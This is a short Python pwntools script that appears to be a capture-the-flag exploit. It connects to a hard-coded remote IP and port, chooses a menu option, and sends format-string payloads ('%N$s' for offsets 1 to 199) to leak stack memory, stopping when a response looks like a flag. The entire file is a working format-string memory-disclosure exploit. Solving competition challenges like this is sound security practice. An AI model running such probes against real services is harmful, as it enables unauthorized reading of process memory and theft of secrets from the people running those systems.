#!/usr/bin/env python3
from pwn import *

host = "18.212.136.134"
port = 8887


def interact_send(r, payload):
    r.recvuntil(b">> ", timeout=3)
    r.sendline(b"1")
    r.recvuntil(b"\n", timeout=3)
    r.sendline(payload)
    data = r.recvuntil(b">> ", timeout=3)
    return data


def main():
    context.log_level = "info"
    for attempt in range(3):
        r = remote(host, port)
        found = False
        for i in range(1, 200):
            payload = f"%{i}$s".encode()
            resp_all = interact_send(r, payload)
            if resp_all:
                lines = resp_all.split(b"\n")
                for line in lines:
                    if b">>" in line:
                        continue
                    if not line:
                        continue
                    print(f"[offset {i}] {line.decode(errors='ignore').strip()}")
                    if b"{" in line and b"}" in line:
                        found = True
                        break
                    if b"pctf" in line.lower() or b"flag" in line.lower():
                        found = True
                        break
                if found:
                    break
        r.close()
        if found:
            break


if __name__ == "__main__":
    main()
